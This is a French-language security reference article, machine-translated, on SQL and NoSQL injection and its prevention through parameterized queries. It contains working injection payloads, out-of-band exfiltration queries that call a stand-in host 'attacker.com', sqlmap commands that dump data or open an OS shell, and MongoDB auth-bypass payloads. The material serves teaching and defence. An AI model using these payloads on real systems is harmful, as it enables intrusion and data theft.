---
title: "Plongée en profondeur dans les injections SQL"
category: techniques
tags: [security, sql-injection, database, sqlmap, web-security]
level: 4
source_sha256: d18ba6e4258c43f8f2bd61c55cb83c8ed8d3b413b2d814e2eeffb8b705d842ea
translation: machine
translated_at: '2026-10-24'
---
# Plongée en profondeur dans les injections SQL {#sql-injection-deep-dive}

Couverture complète des injections SQL : in-band (basées sur UNION), aveugles (booléennes et basées sur le temps), out-of-band, automatisation avec sqlmap, et prévention par requêtes paramétrées dans plusieurs langages et ORM.

## Points clés {#key-facts}
- Une injection SQL se produit lorsque les entrées utilisateur sont concaténées dans des requêtes SQL sans assainissement
- Les requêtes paramétrées / prepared statements constituent la principale défense, et non la validation des entrées seule
- Les ORM utilisent des requêtes paramétrées par défaut, mais les méthodes de requête brutes contournent cette protection
- Le SQLi aveugle extrait les données caractère par caractère lorsqu'aucune erreur ni donnée n'est visible dans les réponses
- `sqlmap` automatise la détection et l'exploitation de tous les types de SQLi

## Types d'injection SQL {#types-of-sql-injection}

### In-Band classique {#classic-in-band}
```sql
-- Authentication bypass
SELECT * FROM users WHERE username='admin'--' AND password='anything'

-- UNION-based data extraction
SELECT * FROM users WHERE id=1 UNION SELECT username,password,3 FROM admin_users--
```

### Aveugle booléenne {#blind-boolean-based}
La requête modifie le comportement de la réponse sans afficher de données :
```sql
-- Determine database name length
id=1 AND LENGTH(database())=5

-- Extract character by character
id=1 AND SUBSTRING(database(),1,1)='a'
id=1 AND ASCII(SUBSTRING(database(),1,1))>96
```

### Aveugle basée sur le temps {#blind-time-based}
Introduire un délai mesurable pour déduire vrai/faux :
```sql
-- MySQL
id=1 AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)

-- MSSQL
id=1; IF (SUBSTRING(DB_NAME(),1,1)='a') WAITFOR DELAY '0:0:5'

-- PostgreSQL
id=1; SELECT CASE WHEN SUBSTRING(current_database(),1,1)='a'
  THEN pg_sleep(5) ELSE pg_sleep(0) END
```

### Out-of-Band {#out-of-band}
Exfiltrer les données via DNS ou HTTP lorsqu'aucun canal in-band n'existe :
```sql
-- MySQL DNS exfiltration
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\x'))

-- MSSQL
EXEC master..xp_dirtree '\\attacker.com\share'

-- Oracle
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual
```

## Schémas {#patterns}

### Automatisation avec sqlmap {#sqlmap-automation}
```bash
# Basic detection
sqlmap -u "http://target.com/page?id=1"

# With authentication
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# Enumerate databases, tables, dump data
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# OS shell (if permissions allow)
sqlmap -u "http://target.com/page?id=1" --os-shell

# POST request
sqlmap -u "http://target.com/login" --data="user=test&pass=test"
```

### Prévention : requêtes paramétrées {#prevention-parameterized-queries}

**Python (psycopg2) :**
```python
# WRONG - vulnerable
cursor.execute(f"SELECT * FROM users WHERE id = {user_input}")

# CORRECT
cursor.execute("SELECT * FROM users WHERE id = %s", (user_input,))
```

**Node.js (pg) :**
```javascript
// WRONG
client.query(`SELECT * FROM users WHERE id = ${userId}`)

// CORRECT
client.query('SELECT * FROM users WHERE id = $1', [userId])
```

**Java (JDBC) :**
```java
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setInt(1, userId);
```

### Sécurité des ORM {#orm-safety}
Les ORM (SQLAlchemy, Django ORM, Prisma, Sequelize) utilisent des requêtes paramétrées par défaut. MAIS les méthodes de requête brutes contournent cette protection :
```python
# Django - STILL VULNERABLE if interpolating user input
Model.objects.raw(f"SELECT * FROM table WHERE id = {user_input}")

# Safe
Model.objects.raw("SELECT * FROM table WHERE id = %s", [user_input])
```

## Injection NoSQL {#nosql-injection}
Injection de requêtes MongoDB via les opérateurs JSON :
```javascript
// Vulnerable
db.users.find({ username: req.body.username, password: req.body.password })

// Attack payload (bypasses auth)
{ "username": "admin", "password": { "$ne": "" } }

// Other abused operators: $gt, $regex, $where
{ "username": { "$regex": ".*" }, "password": { "$regex": ".*" } }
```

Prévention : validation du type des entrées (rejeter les objets là où des chaînes sont attendues), middleware `express-mongo-sanitize`, éviter l'opérateur `$where`.

## Pièges courants {#gotchas}
- Les règles WAF détectent les motifs courants mais sont contournées par l'encodage, la variation de casse ou les commentaires (`/**/`)
- SQLi de second ordre : l'entrée est stockée en toute sécurité, puis utilisée dans une requête ailleurs sans paramétrage
- Le SQLi aveugle est lent (caractère par caractère), mais entièrement automatisé par des outils comme sqlmap
- Les permissions de l'utilisateur de base de données limitent les dégâts : un utilisateur en lecture seule empêche `DROP TABLE` même si l'injection réussit
- Les ORM sont sûrs par défaut, mais chaque ORM fournit une échappatoire de requête brute que les développeurs utilisent à mauvais escient

## Voir aussi {#see-also}
- [[web-application-security-fundamentals]] - OWASP Top 10, autres vulnérabilités web
- [Sécurité des bases de données](database-security.md) - privilèges utilisateur, chiffrement, audit
- [[burp-suite-and-web-pentesting]] - tester les injections SQL avec Burp
- [[secure-backend-development]] - schémas de validation des entrées
